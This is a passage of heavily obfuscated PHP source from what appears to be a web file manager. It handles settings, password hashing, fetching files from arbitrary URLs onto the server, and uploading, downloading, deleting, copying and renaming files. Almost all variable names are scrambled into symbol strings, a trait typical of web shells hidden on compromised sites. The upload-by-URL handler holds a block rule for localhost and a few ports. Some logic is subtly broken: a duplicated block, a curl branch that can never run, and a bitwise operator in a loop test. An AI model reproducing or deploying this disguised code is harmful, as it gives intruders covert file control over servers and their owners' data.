            if (copy($‰ΏΏ‚µΈγΌγγΏγγ, $γγο™²γγ¬γγγ²„†Όγ . $†ΌΌγΌγ®‰γγγ»¬οογ)) {
                echo "Backup {$†ΌΌγΌγ®‰γγγ»¬οογ} created";
            } else {
                throw new Exception("Could not copy file {$γ†„ο‚ο„‰†γγ}");
            }
        } catch (Exception $γγγΌΌ†ογ‚γγ) {
            echo $γγγΌΌ†ογ‚γγ->getMessage();
        }
    }

    // Save Config
    if (isset($_POST['type']) && $_POST['type'] == "settings") {
        global $γ™γ‚†™„Όγγ­†γΌγγ, $»γογογγ™γ²γ, $“γ‚γ―γγο†‚»γγγγ, $»†„Ό‰—¬γΌΌ†γ††‰», $γγγ„γγ‰γγγ‚Όγ‚ογγΌ, $Όγγο“„γ²γΌ†γ†γγγγ, $γ„γ¬γγΏογοο‰―²οοΌ;
        $•γ‰γ‚‰γγ™γΌγογ = $_POST['js-language'];
        fm_get_translations([]);
        if (!array_key_exists($•γ‰γ‚‰γγ™γΌγογ, $γγγ„γγ‰γγγ‚Όγ‚ογγΌ)) {
            $•γ‰γ‚‰γγ™γΌγογ = 'en';
        }

        $»γ‚γγγΌΌγγ“‰†ο = isset($_POST['js-error-report']) && $_POST['js-error-report'] == "true" ? true : false;
        $ΌΈ‰‰ΌΏΌΌοογοΌογγγ“ = isset($_POST['js-show-hidden']) && $_POST['js-show-hidden'] == "true" ? true : false;
        $γγΌγγ²γ‚Ώγ‚ΌΌγγ = isset($_POST['js-hide-cols']) && $_POST['js-hide-cols'] == "true" ? true : false;
        $‚‰γγ²µγ†γγγΌ = $_POST['js-theme-3'];

        if ($γ™γ‚†™„Όγγ­†γΌγγ->data['lang'] != $•γ‰γ‚‰γγ™γΌγογ) {
            $γ™γ‚†™„Όγγ­†γΌγγ->data['lang'] = $•γ‰γ‚‰γγ™γΌγογ;
            $»γογογγ™γ²γ = $•γ‰γ‚‰γγ™γΌγογ;
        }
        if ($γ™γ‚†™„Όγγ­†γΌγγ->data['error_reporting'] != $»γ‚γγγΌΌγγ“‰†ο) {
            $γ™γ‚†™„Όγγ­†γΌγγ->data['error_reporting'] = $»γ‚γγγΌΌγγ“‰†ο;
            $“γ‚γ―γγο†‚»γγγγ = $»γ‚γγγΌΌγγ“‰†ο;
        }
        if ($γ™γ‚†™„Όγγ­†γΌγγ->data['show_hidden'] != $ΌΈ‰‰ΌΏΌΌοογοΌογγγ“) {
            $γ™γ‚†™„Όγγ­†γΌγγ->data['show_hidden'] = $ΌΈ‰‰ΌΏΌΌοογοΌογγγ“;
            $»†„Ό‰—¬γΌΌ†γ††‰» = $ΌΈ‰‰ΌΏΌΌοογοΌογγγ“;
        }
        if ($γ™γ‚†™„Όγγ­†γΌγγ->data['show_hidden'] != $ΌΈ‰‰ΌΏΌΌοογοΌογγγ“) {
            $γ™γ‚†™„Όγγ­†γΌγγ->data['show_hidden'] = $ΌΈ‰‰ΌΏΌΌοογοΌογγγ“;
            $»†„Ό‰—¬γΌΌ†γ††‰» = $ΌΈ‰‰ΌΏΌΌοογοΌογγγ“;
        }
        if ($γ™γ‚†™„Όγγ­†γΌγγ->data['hide_Cols'] != $γγΌγγ²γ‚Ώγ‚ΌΌγγ) {
            $γ™γ‚†™„Όγγ­†γΌγγ->data['hide_Cols'] = $γγΌγγ²γ‚Ώγ‚ΌΌγγ;
            $Όγγο“„γ²γΌ†γ†γγγγ = $γγΌγγ²γ‚Ώγ‚ΌΌγγ;
        }
        if ($γ™γ‚†™„Όγγ­†γΌγγ->data['theme'] != $‚‰γγ²µγ†γγγΌ) {
            $γ™γ‚†™„Όγγ­†γΌγγ->data['theme'] = $‚‰γγ²µγ†γγγΌ;
            $γ„γ¬γγΏογοο‰―²οοΌ = $‚‰γγ²µγ†γγγΌ;
        }
        $γ™γ‚†™„Όγγ­†γΌγγ->save();
        echo true;
    }

    // new password hash
    if (isset($_POST['type']) && $_POST['type'] == "pwdhash") {
        $Όγγο»γΌ‰•ΌΌ™‚ = isset($_POST['inputPassword2']) && !empty($_POST['inputPassword2']) ? password_hash($_POST['inputPassword2'], PASSWORD_DEFAULT) : '';
        echo $Όγγο»γΌ‰•ΌΌ™‚;
    }

    //upload using url
    if (isset($_POST['type']) && $_POST['type'] == "upload" && !empty($_REQUEST["uploadurl"])) {
        $γΌγ‚²γγοΌΌγ„²«„ = FM_ROOT_PATH;
        if (FM_PATH != '') {
            $γΌγ‚²γγοΌΌγ„²«„ .= '/' . FM_PATH;
        }

        function event_callback($†„γγ¬ογγ†„µ„)
        {
            global $“™ογΌ‚γγγγγγγ‚™;
            echo json_encode($†„γγ¬ογγ†„µ„);
        }

        function get_file_path()
        {
            global $γΌγ‚²γγοΌΌγ„²«„, $‰γγογ‚ογγ™‰‰, $‚γ‹γ«γογ«γ‚™Όο;
            return $γΌγ‚²γγοΌΌγ„²«„ . "/" . basename($‰γγογ‚ογγ™‰‰->name);
        }

        $γγ‚•ΈΌΌ­γγγγγ = !empty($_REQUEST["uploadurl"]) && preg_match("|^http(s)?://.+$|", stripslashes($_REQUEST["uploadurl"])) ? stripslashes($_REQUEST["uploadurl"]) : null;

        //prevent 127.* domain and known ports
        $γγγγογΌ‰†»γ‰ = parse_url($γγ‚•ΈΌΌ­γγγγγ, PHP_URL_HOST);
        $µ²•¦ο‚ΌγΌοο•²Ό†‹ = parse_url($γγ‚•ΈΌΌ­γγγγγ, PHP_URL_PORT);
        $Όγγγ†γ‚γγγ¦†ο„ = [22, 23, 25, 3306];

        if (preg_match("/^localhost$|^127(?:\.[0-9]+){0,2}\.[0-9]+$|^(?:0*\:)*?:?0*1$/i", $γγγγογΌ‰†»γ‰) || in_array($µ²•¦ο‚ΌγΌοο•²Ό†‹, $Όγγγ†γ‚γγγ¦†ο„)) {
            $ΌΏγΏ¬οο¦Όγγγ‰„ο = array("message" => "URL is not allowed");
            event_callback(array("fail" => $ΌΏγΏ¬οο¦Όγγγ‰„ο));
            exit();
        }

        $γγ“γγγγγγγγΈ‰Όγ = false;
        $‚γ‹γ«γογ«γ‚™Όο = tempnam(sys_get_temp_dir(), "upload-");
        $‰γγογ‚ογγ™‰‰ = new stdClass();
        $‰γγογ‚ογγ™‰‰->name = trim(urldecode(basename($γγ‚•ΈΌΌ­γγγγγ)), ".\x00..\x20");

        $γ‚ο™‚ογΏγογγογ“γ = (FM_UPLOAD_EXTENSION) ? explode(',', FM_UPLOAD_EXTENSION) : false;
        $γγγ‚‚‚γ«‚γ‰‰Όγο = strtolower(pathinfo($‰γγογ‚ογγ™‰‰->name, PATHINFO_EXTENSION));
        $ο•γγογΌγγγγγ‚ο = ($γ‚ο™‚ογΏγογγογ“γ) ? in_array($γγγ‚‚‚γ«‚γ‰‰Όγο, $γ‚ο™‚ογΏγογγογ“γ) : true;

        $ΌΏγΏ¬οο¦Όγγγ‰„ο = false;

        if (!$ο•γγογΌγγγγγ‚ο) {
            $ΌΏγΏ¬οο¦Όγγγ‰„ο = array("message" => "File extension is not allowed");
            event_callback(array("fail" => $ΌΏγΏ¬οο¦Όγγγ‰„ο));
            exit();
        }

        if (!$γγ‚•ΈΌΌ­γγγγγ) {
            $Ό„γγ•†ογγγο‰Ό†™ = false;
        } else if ($γγ“γγγγγγγγΈ‰Όγ) {
            @$Όγ»ο‚γο‚‚ογγ‚ = fopen($‚γ‹γ«γογ«γ‚™Όο, "w");
            @$οΌ®γγ―††Όο† = curl_init($γγ‚•ΈΌΌ­γγγγγ);
            curl_setopt($οΌ®γγ―††Όο†, CURLOPT_NOPROGRESS, false);
            curl_setopt($οΌ®γγ―††Όο†, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($οΌ®γγ―††Όο†, CURLOPT_FILE, $Όγ»ο‚γο‚‚ογγ‚);
            @$Ό„γγ•†ογγγο‰Ό†™ = curl_exec($οΌ®γγ―††Όο†);
            $γγγογο„γγγ«Ό‰γ† = curl_getinfo($οΌ®γγ―††Όο†);
            if (!$Ό„γγ•†ογγγο‰Ό†™) {
                $ΌΏγΏ¬οο¦Όγγγ‰„ο = array("message" => curl_error($οΌ®γγ―††Όο†));
            }
            @curl_close($οΌ®γγ―††Όο†);
            fclose($Όγ»ο‚γο‚‚ογγ‚);
            $‰γγογ‚ογγ™‰‰->size = $γγγογο„γγγ«Ό‰γ†["size_download"];
            $‰γγογ‚ογγ™‰‰->type = $γγγογο„γγγ«Ό‰γ†["content_type"];
        } else {
            $Όγγ‰‰‰γ‚²γΌγ = stream_context_create();
            @$Ό„γγ•†ογγγο‰Ό†™ = copy($γγ‚•ΈΌΌ­γγγγγ, $‚γ‹γ«γογ«γ‚™Όο, $Όγγ‰‰‰γ‚²γΌγ);
            if (!$Ό„γγ•†ογγγο‰Ό†™) {
                $ΌΏγΏ¬οο¦Όγγγ‰„ο = error_get_last();
            }
        }

        if ($Ό„γγ•†ογγγο‰Ό†™) {
            $Ό„γγ•†ογγγο‰Ό†™ = rename($‚γ‹γ«γογ«γ‚™Όο, strtok(get_file_path(), '?'));
        }

        if ($Ό„γγ•†ογγγο‰Ό†™) {
            event_callback(array("done" => $‰γγογ‚ογγ™‰‰));
        } else {
            unlink($‚γ‹γ«γογ«γ‚™Όο);
            if (!$ΌΏγΏ¬οο¦Όγγγ‰„ο) {
                $ΌΏγΏ¬οο¦Όγγγ‰„ο = array("message" => "Invalid url parameter");
            }
            event_callback(array("fail" => $ΌΏγΏ¬οο¦Όγγγ‰„ο));
        }
    }
    exit();
}

// Delete file / folder
if (isset($_GET['del'], $_POST['token']) && !FM_READONLY) {
    $γγγ““γγΌγ¦ = str_replace('/', '', fm_clean_path($_GET['del']));
    if ($γγγ““γγΌγ¦ != '' && $γγγ““γγΌγ¦ != '..' && $γγγ““γγΌγ¦ != '.' && verifyToken($_POST['token'])) {
        $γΌγ‚²γγοΌΌγ„²«„ = FM_ROOT_PATH;
        if (FM_PATH != '') {
            $γΌγ‚²γγοΌΌγ„²«„ .= '/' . FM_PATH;
        }
        $ΌΏγ†γγ‚ογ»γγ = is_dir($γΌγ‚²γγοΌΌγ„²«„ . '/' . $γγγ““γγΌγ¦);
        if (fm_rdelete($γΌγ‚²γγοΌΌγ„²«„ . '/' . $γγγ““γγΌγ¦)) {
            $‚γ†γ²•„γ„γΌγ‚γ•‚ = $ΌΏγ†γγ‚ογ»γγ ? lng('Folder') . ' <b>%s</b> ' . lng('Deleted') : lng('File') . ' <b>%s</b> ' . lng('Deleted');
            fm_set_msg(sprintf($‚γ†γ²•„γ„γΌγ‚γ•‚, fm_enc($γγγ““γγΌγ¦)));
        } else {
            $‚γ†γ²•„γ„γΌγ‚γ•‚ = $ΌΏγ†γγ‚ογ»γγ ? lng('Folder') . ' <b>%s</b> ' . lng('not deleted') : lng('File') . ' <b>%s</b> ' . lng('not deleted');
            fm_set_msg(sprintf($‚γ†γ²•„γ„γΌγ‚γ•‚, fm_enc($γγγ““γγΌγ¦)), 'error');
        }
    } else {
        fm_set_msg(lng('Invalid file or folder name'), 'error');
    }
    $‚¦γγγ‚γγ‰γΈΌΏ = FM_PATH;
    fm_redirect(FM_SELF_URL . '?p=' . urlencode($‚¦γγγ‚γγ‰γΈΌΏ));
}

// Create a new file/folder
if (isset($_POST['newfilename'], $_POST['newfile'], $_POST['token']) && !FM_READONLY) {
    $µ‚γ„Ώ‚γ‚γγ‚γγο‚γγ = urldecode($_POST['newfile']);
    $„‚γΎ‚γ‚Όγγ²γ = str_replace('/', '', fm_clean_path(strip_tags($_POST['newfilename'])));
    if (fm_isvalid_filename($„‚γΎ‚γ‚Όγγ²γ) && $„‚γΎ‚γ‚Όγγ²γ != '' && $„‚γΎ‚γ‚Όγγ²γ != '..' && $„‚γΎ‚γ‚Όγγ²γ != '.' && verifyToken($_POST['token'])) {
        $γΌγ‚²γγοΌΌγ„²«„ = FM_ROOT_PATH;
        if (FM_PATH != '') {
            $γΌγ‚²γγοΌΌγ„²«„ .= '/' . FM_PATH;
        }
        if ($µ‚γ„Ώ‚γ‚γγ‚γγο‚γγ == "file") {
            if (!file_exists($γΌγ‚²γγοΌΌγ„²«„ . '/' . $„‚γΎ‚γ‚Όγγ²γ)) {
                if (fm_is_valid_ext($„‚γΎ‚γ‚Όγγ²γ)) {
                    @fopen($γΌγ‚²γγοΌΌγ„²«„ . '/' . $„‚γΎ‚γ‚Όγγ²γ, 'w') or die('Cannot open file:  ' . $„‚γΎ‚γ‚Όγγ²γ);
                    fm_set_msg(sprintf(lng('File') . ' <b>%s</b> ' . lng('Created'), fm_enc($„‚γΎ‚γ‚Όγγ²γ)));
                } else {
                    fm_set_msg(lng('File extension is not allowed'), 'error');
                }
            } else {
                fm_set_msg(sprintf(lng('File') . ' <b>%s</b> ' . lng('already exists'), fm_enc($„‚γΎ‚γ‚Όγγ²γ)), 'alert');
            }
        } else {
            if (fm_mkdir($γΌγ‚²γγοΌΌγ„²«„ . '/' . $„‚γΎ‚γ‚Όγγ²γ, false) === true) {
                fm_set_msg(sprintf(lng('Folder') . ' <b>%s</b> ' . lng('Created'), $„‚γΎ‚γ‚Όγγ²γ));
            } elseif (fm_mkdir($γΌγ‚²γγοΌΌγ„²«„ . '/' . $„‚γΎ‚γ‚Όγγ²γ, false) === $γΌγ‚²γγοΌΌγ„²«„ . '/' . $„‚γΎ‚γ‚Όγγ²γ) {
                fm_set_msg(sprintf(lng('Folder') . ' <b>%s</b> ' . lng('already exists'), fm_enc($„‚γΎ‚γ‚Όγγ²γ)), 'alert');
            } else {
                fm_set_msg(sprintf(lng('Folder') . ' <b>%s</b> ' . lng('not created'), fm_enc($„‚γΎ‚γ‚Όγγ²γ)), 'error');
            }
        }
    } else {
        fm_set_msg(lng('Invalid characters in file or folder name'), 'error');
    }
    $‚¦γγγ‚γγ‰γΈΌΏ = FM_PATH;
    fm_redirect(FM_SELF_URL . '?p=' . urlencode($‚¦γγγ‚γγ‰γΈΌΏ));
}

// Copy folder / file
if (isset($_GET['copy'], $_GET['finish']) && !FM_READONLY) {
    // from
    $γγ„‚Ώ™γ‰γγο¦ο―γ—† = urldecode($_GET['copy']);
    $γγ„‚Ώ™γ‰γγο¦ο―γ—† = fm_clean_path($γγ„‚Ώ™γ‰γγο¦ο―γ—†);
    // empty path
    if ($γγ„‚Ώ™γ‰γγο¦ο―γ—† == '') {
        fm_set_msg(lng('Source path not defined'), 'error');
        $‚¦γγγ‚γγ‰γΈΌΏ = FM_PATH;
        fm_redirect(FM_SELF_URL . '?p=' . urlencode($‚¦γγγ‚γγ‰γΈΌΏ));
    }
    // abs path from
    $‰γγ¦‚γ®―γγο‰γ = FM_ROOT_PATH . '/' . $γγ„‚Ώ™γ‰γγο¦ο―γ—†;
    // abs path to
    $»»γΌ‚†²Όγ‚―Ύογ = FM_ROOT_PATH;
    if (FM_PATH != '') {
        $»»γΌ‚†²Όγ‚―Ύογ .= '/' . FM_PATH;
    }
    $»»γΌ‚†²Όγ‚―Ύογ .= '/' . basename($‰γγ¦‚γ®―γγο‰γ);
    // move?
    $γγ„ΈΎΌγΌγ•‚ο†γ™ = isset($_GET['move']);
    $γγ„ΈΎΌγΌγ•‚ο†γ™ = fm_clean_path(urldecode($γγ„ΈΎΌγΌγ•‚ο†γ™));
    // copy/move/duplicate
    if ($‰γγ¦‚γ®―γγο‰γ != $»»γΌ‚†²Όγ‚―Ύογ) {
        $γ‚™γγ‰Όγ―‰γγ„‚ο = trim(FM_PATH . '/' . basename($‰γγ¦‚γ®―γγο‰γ), '/');
        if ($γγ„ΈΎΌγΌγ•‚ο†γ™) { // Move and to != from so just perform move
            $γΌ¬»γογ»γο‚‚― = fm_rename($‰γγ¦‚γ®―γγο‰γ, $»»γΌ‚†²Όγ‚―Ύογ);
            if ($γΌ¬»γογ»γο‚‚―) {
                fm_set_msg(sprintf(lng('Moved from') . ' <b>%s</b> ' . lng('to') . ' <b>%s</b>', fm_enc($γγ„‚Ώ™γ‰γγο¦ο―γ—†), fm_enc($γ‚™γγ‰Όγ―‰γγ„‚ο)));
            } elseif ($γΌ¬»γογ»γο‚‚― === null) {
                fm_set_msg(lng('File or folder with this path already exists'), 'alert');
            } else {
                fm_set_msg(sprintf(lng('Error while moving from') . ' <b>%s</b> ' . lng('to') . ' <b>%s</b>', fm_enc($γγ„‚Ώ™γ‰γγο¦ο―γ—†), fm_enc($γ‚™γγ‰Όγ―‰γγ„‚ο)), 'error');
            }
        } else { // Not move and to != from so copy with original name
            if (fm_rcopy($‰γγ¦‚γ®―γγο‰γ, $»»γΌ‚†²Όγ‚―Ύογ)) {
                fm_set_msg(sprintf(lng('Copied from') . ' <b>%s</b> ' . lng('to') . ' <b>%s</b>', fm_enc($γγ„‚Ώ™γ‰γγο¦ο―γ—†), fm_enc($γ‚™γγ‰Όγ―‰γγ„‚ο)));
            } else {
                fm_set_msg(sprintf(lng('Error while copying from') . ' <b>%s</b> ' . lng('to') . ' <b>%s</b>', fm_enc($γγ„‚Ώ™γ‰γγο¦ο―γ—†), fm_enc($γ‚™γγ‰Όγ―‰γγ„‚ο)), 'error');
            }
        }
    } else {
        if (!$γγ„ΈΎΌγΌγ•‚ο†γ™) { //Not move and to = from so duplicate
            $γ‚™γγ‰Όγ―‰γγ„‚ο = trim(FM_PATH . '/' . basename($‰γγ¦‚γ®―γγο‰γ), '/');
            $γ»‚‚γγ™‚γ‚γγΏΌ•γ = pathinfo($‰γγ¦‚γ®―γγο‰γ);
            $‚γΈγΌογγ‚Ώογ = '';
            if (!is_dir($‰γγ¦‚γ®―γγο‰γ)) {
                $‚γΈγΌογγ‚Ώογ = '.' . $γ»‚‚γγ™‚γ‚γγΏΌ•γ['extension'];
            }
            //Create new name for duplicate
            $γγΌΏ‚γ„Όγογ„γ = $γ»‚‚γγ™‚γ‚γγΏΌ•γ['dirname'] . '/' . $γ»‚‚γγ™‚γ‚γγΏΌ•γ['filename'] . '-' . date('YmdHis') . $‚γΈγΌογγ‚Ώογ;
            $γγγο‚„ογγΌΌγ‚γΌγ = 0;
            $γΈΌ“γγ¦γ‹γΎγΌγ» = 1000;
            // Check if a file with the duplicate name already exists, if so, make new name (edge case...)
            while (file_exists($γγΌΏ‚γ„Όγογ„γ) & $γγγο‚„ογγΌΌγ‚γΌγ < $γΈΌ“γγ¦γ‹γΎγΌγ») {
                $γ»‚‚γγ™‚γ‚γγΏΌ•γ = pathinfo($γγΌΏ‚γ„Όγογ„γ);
                $γγΌΏ‚γ„Όγογ„γ = $γ»‚‚γγ™‚γ‚γγΏΌ•γ['dirname'] . '/' . $γ»‚‚γγ™‚γ‚γγΏΌ•γ['filename'] . '-copy' . $‚γΈγΌογγ‚Ώογ;
                $γγγο‚„ογγΌΌγ‚γΌγ++;
            }
            if (fm_rcopy($‰γγ¦‚γ®―γγο‰γ, $γγΌΏ‚γ„Όγογ„γ, False)) {
                fm_set_msg(sprintf('Copied from <b>%s</b> to <b>%s</b>', fm_enc($γγ„‚Ώ™γ‰γγο¦ο―γ—†), fm_enc($γγΌΏ‚γ„Όγογ„γ)));
            } else {
                fm_set_msg(sprintf('Error while copying from <b>%s</b> to <b>%s</b>', fm_enc($γγ„‚Ώ™γ‰γγο¦ο―γ—†), fm_enc($γγΌΏ‚γ„Όγογ„γ)), 'error');
            }
        } else {
            fm_set_msg(lng('Paths must be not equal'), 'alert');
        }
    }
    $‚¦γγγ‚γγ‰γΈΌΏ = FM_PATH;
    fm_redirect(FM_SELF_URL . '?p=' . urlencode($‚¦γγγ‚γγ‰γΈΌΏ));
}

// Mass copy files/ folders
if (isset($_POST['file'], $_POST['copy_to'], $_POST['finish'], $_POST['token']) && !FM_READONLY) {

    if (!verifyToken($_POST['token'])) {
        fm_set_msg(lng('Invalid Token.'), 'error');
    }

    // from
    $γΌγ‚²γγοΌΌγ„²«„ = FM_ROOT_PATH;
    if (FM_PATH != '') {
        $γΌγ‚²γγοΌΌγ„²«„ .= '/' . FM_PATH;
    }
    // to
    $γΌγγγ‰‰‚γΈγγ = FM_ROOT_PATH;
    $οο‚γγγΌ‚γ„‰γ„γ¦ = fm_clean_path($_POST['copy_to']);
    if ($οο‚γγγΌ‚γ„‰γ„γ¦ != '') {
        $γΌγγγ‰‰‚γΈγγ .= '/' . $οο‚γγγΌ‚γ„‰γ„γ¦;
    }
    if ($γΌγ‚²γγοΌΌγ„²«„ == $γΌγγγ‰‰‚γΈγγ) {
        fm_set_msg(lng('Paths must be not equal'), 'alert');
        $‚¦γγγ‚γγ‰γΈΌΏ = FM_PATH;
        fm_redirect(FM_SELF_URL . '?p=' . urlencode($‚¦γγγ‚γγ‰γΈΌΏ));
    }
    if (!is_dir($γΌγγγ‰‰‚γΈγγ)) {
        if (!fm_mkdir($γΌγγγ‰‰‚γΈγγ, true)) {
            fm_set_msg('Unable to create destination folder', 'error');
            $‚¦γγγ‚γγ‰γΈΌΏ = FM_PATH;
            fm_redirect(FM_SELF_URL . '?p=' . urlencode($‚¦γγγ‚γγ‰γΈΌΏ));
        }
    }
    // move?
    $γγ„ΈΎΌγΌγ•‚ο†γ™ = isset($_POST['move']);
    // copy/move
    $Ό†γΎ—γγγΌγ²Έο = 0;
    $ο‚γΌγγγ»‚γ‰Όγ‚ = $_POST['file'];
    if (is_array($ο‚γΌγγγ»‚γ‰Όγ‚) && count($ο‚γΌγγγ»‚γ‰Όγ‚)) {
        foreach ($ο‚γΌγγγ»‚γ‰Όγ‚ as $ογ‚γγµγογογΌγ») {
            if ($ογ‚γγµγογογΌγ» != '') {
                $ογ‚γγµγογογΌγ» = fm_clean_path($ογ‚γγµγογογΌγ»);
                // abs path from
                $‰γγ¦‚γ®―γγο‰γ = $γΌγ‚²γγοΌΌγ„²«„ . '/' . $ογ‚γγµγογογΌγ»;
                // abs path to
                $»»γΌ‚†²Όγ‚―Ύογ = $γΌγγγ‰‰‚γΈγγ . '/' . $ογ‚γγµγογογΌγ»;
                // do
                if ($γγ„ΈΎΌγΌγ•‚ο†γ™) {
                    $γΌ¬»γογ»γο‚‚― = fm_rename($‰γγ¦‚γ®―γγο‰γ, $»»γΌ‚†²Όγ‚―Ύογ);
                    if ($γΌ¬»γογ»γο‚‚― === false) {
                        $Ό†γΎ—γγγΌγ²Έο++;
                    }
                } else {
                    if (!fm_rcopy($‰γγ¦‚γ®―γγο‰γ, $»»γΌ‚†²Όγ‚―Ύογ)) {
                        $Ό†γΎ—γγγΌγ²Έο++;
                    }
                }
            }
        }
        if ($Ό†γΎ—γγγΌγ²Έο == 0) {
            $‚γ†γ²•„γ„γΌγ‚γ•‚ = $γγ„ΈΎΌγΌγ•‚ο†γ™ ? 'Selected files and folders moved' : 'Selected files and folders copied';
            fm_set_msg($‚γ†γ²•„γ„γΌγ‚γ•‚);
        } else {
            $‚γ†γ²•„γ„γΌγ‚γ•‚ = $γγ„ΈΎΌγΌγ•‚ο†γ™ ? 'Error while moving items' : 'Error while copying items';
            fm_set_msg($‚γ†γ²•„γ„γΌγ‚γ•‚, 'error');
        }
    } else {
        fm_set_msg(lng('Nothing selected'), 'alert');
    }
    $‚¦γγγ‚γγ‰γΈΌΏ = FM_PATH;
    fm_redirect(FM_SELF_URL . '?p=' . urlencode($‚¦γγγ‚γγ‰γΈΌΏ));
}

// Rename
if (isset($_POST['rename_from'], $_POST['rename_to'], $_POST['token']) && !FM_READONLY) {
    if (!verifyToken($_POST['token'])) {
        fm_set_msg("Invalid Token.", 'error');
    }
    // old name
    $γ―Όγγ‚«“™¦µ‰γγ = urldecode($_POST['rename_from']);
    $γ―Όγγ‚«“™¦µ‰γγ = fm_clean_path($γ―Όγγ‚«“™¦µ‰γγ);
    $γ―Όγγ‚«“™¦µ‰γγ = str_replace('/', '', $γ―Όγγ‚«“™¦µ‰γγ);
    // new name
    $„‚γΎ‚γ‚Όγγ²γ = urldecode($_POST['rename_to']);
    $„‚γΎ‚γ‚Όγγ²γ = fm_clean_path(strip_tags($„‚γΎ‚γ‚Όγγ²γ));
    $„‚γΎ‚γ‚Όγγ²γ = str_replace('/', '', $„‚γΎ‚γ‚Όγγ²γ);
    // path
    $γΌγ‚²γγοΌΌγ„²«„ = FM_ROOT_PATH;
    if (FM_PATH != '') {
        $γΌγ‚²γγοΌΌγ„²«„ .= '/' . FM_PATH;
    }
    // rename
    if (fm_isvalid_filename($„‚γΎ‚γ‚Όγγ²γ) && $γ―Όγγ‚«“™¦µ‰γγ != '' && $„‚γΎ‚γ‚Όγγ²γ != '') {
        if (fm_rename($γΌγ‚²γγοΌΌγ„²«„ . '/' . $γ―Όγγ‚«“™¦µ‰γγ, $γΌγ‚²γγοΌΌγ„²«„ . '/' . $„‚γΎ‚γ‚Όγγ²γ)) {
            fm_set_msg(sprintf(lng('Renamed from') . ' <b>%s</b> ' . lng('to') . ' <b>%s</b>', fm_enc($γ―Όγγ‚«“™¦µ‰γγ), fm_enc($„‚γΎ‚γ‚Όγγ²γ)));
        } else {
            fm_set_msg(sprintf(lng('Error while renaming from') . ' <b>%s</b> ' . lng('to') . ' <b>%s</b>', fm_enc($γ―Όγγ‚«“™¦µ‰γγ), fm_enc($„‚γΎ‚γ‚Όγγ²γ)), 'error');
        }
    } else {
        fm_set_msg(lng('Invalid characters in file name'), 'error');
    }
    $‚¦γγγ‚γγ‰γΈΌΏ = FM_PATH;
    fm_redirect(FM_SELF_URL . '?p=' . urlencode($‚¦γγγ‚γγ‰γΈΌΏ));
}

// Download
if (isset($_GET['dl'], $_POST['token'])) {
    // Verify the token to ensure it's valid
    if (!verifyToken($_POST['token'])) {
        fm_set_msg("Invalid Token.", 'error');
        exit;
    }

    // Clean the download file path
    $ογ‚Ό™γ²ΌγΌΌγ‚ = urldecode($_GET['dl']);
    $ογ‚Ό™γ²ΌγΌΌγ‚ = fm_clean_path($ογ‚Ό™γ²ΌγΌΌγ‚);
    $ογ‚Ό™γ²ΌγΌΌγ‚ = str_replace('/', '', $ογ‚Ό™γ²ΌγΌΌγ‚); // Prevent directory traversal attacks

    // Define the file path
    $γΌγ‚²γγοΌΌγ„²«„ = FM_ROOT_PATH;
    if (FM_PATH != '') {
        $γΌγ‚²γγοΌΌγ„²«„ .= '/' . FM_PATH;
    }

    // Check if the file exists and is valid
    if ($ογ‚Ό™γ²ΌγΌΌγ‚ != '' && is_file($γΌγ‚²γγοΌΌγ„²«„ . '/' . $ογ‚Ό™γ²ΌγΌΌγ‚)) {
        // Close the session to prevent session locking
        if (session_status() === PHP_SESSION_ACTIVE) {
            session_write_close();
        }

        // Call the download function
        fm_download_file($γΌγ‚²γγοΌΌγ„²«„ . '/' . $ογ‚Ό™γ²ΌγΌΌγ‚, $ογ‚Ό™γ²ΌγΌΌγ‚, 1024); // Download with a buffer size of 1024 bytes
        exit;
    } else {
        // Handle the case where the file is not found
        fm_set_msg(lng('File not found'), 'error');
        $‚¦γγγ‚γγ‰γΈΌΏ = FM_PATH;
        fm_redirect(FM_SELF_URL . '?p=' . urlencode($‚¦γγγ‚γγ‰γΈΌΏ));
    }
}

// Upload
if (!empty($_FILES) && !FM_READONLY) {
    if (isset($_POST['token'])) {
        if (!verifyToken($_POST['token'])) {
            $‚γγγ‰Ό‚ογ—‚†γΌΎ = array('status' => 'error', 'info' => "Invalid Token.");
            echo json_encode($‚γγγ‰Ό‚ογ—‚†γΌΎ);
            exit();
        }
    } else {
        $‚γγγ‰Ό‚ογ—‚†γΌΎ = array('status' => 'error', 'info' => "Token Missing.");
        echo json_encode($‚γγγ‰Ό‚ογ—‚†γΌΎ);
        exit();
    }

    $γγ²‚γ»γ‰γγ™γ‰ = $_POST['dzchunkindex'];
    $‚Όγγγ‰µ‚γ„γγ = $_POST['dztotalchunkcount'];
    $γγγ‚γγγ†‰γγ¦ = fm_clean_path($_REQUEST['fullpath']);

    $ογ‚γγµγογογΌγ» = $_FILES;
    $γΌγ‚²γγοΌΌγ„²«„ = FM_ROOT_PATH;
    $²γγΌ²•Έγ‚γ®γ‚®Ώ = DIRECTORY_SEPARATOR;
    if (FM_PATH != '') {
        $γΌγ‚²γγοΌΌγ„²«„ .= '/' . FM_PATH;
    }

    $Ό†γΎ—γγγΌγ²Έο = 0;
    $γ‚‰ογγΌ«γγ―οο = 0;
    $γ‚ο™‚ογΏγογγογ“γ = (FM_UPLOAD_EXTENSION) ? explode(',', FM_UPLOAD_EXTENSION) : false;
    $‚γγγ‰Ό‚ογ—‚†γΌΎ = array(
        'status' => 'error',
        'info'   => 'Oops! Try again'
    );

    $γµΌ„γγγογ²“‚‰»ΌΌ = $ογ‚γγµγογογΌγ»['file']['name'];
    $Ώγ†γ¬γογγγΌγγ‚γο = $ογ‚γγµγογογΌγ»['file']['tmp_name'];
    $γγγ‚‚‚γ«‚γ‰‰Όγο = pathinfo($γµΌ„γγγογ²“‚‰»ΌΌ, PATHINFO_FILENAME) != '' ? strtolower(pathinfo($γµΌ„γγγογ²“‚‰»ΌΌ, PATHINFO_EXTENSION)) : '';
    $ο•γγογΌγγγγγ‚ο = ($γ‚ο™‚ογΏγογγογ“γ) ? in_array($γγγ‚‚‚γ«‚γ‰‰Όγο, $γ‚ο™‚ογΏγογγογ“γ) : true;

    if (!fm_isvalid_filename($γµΌ„γγγογ²“‚‰»ΌΌ) && !fm_isvalid_filename($γγγ‚γγγ†‰γγ¦)) {
        $‚γγγ‰Ό‚ογ—‚†γΌΎ = array(
            'status'    => 'error',
            'info'      => "Invalid File name!",
        );
        echo json_encode($‚γγγ‰Ό‚ογ—‚†γΌΎ);
        exit();
    }

    $γΏ‹µ„γγγ„‚γ¦‚— = $γΌγ‚²γγοΌΌγ„²«„ . $²γγΌ²•Έγ‚γ®γ‚®Ώ;
    if (is_writable($γΏ‹µ„γγγ„‚γ¦‚—)) {
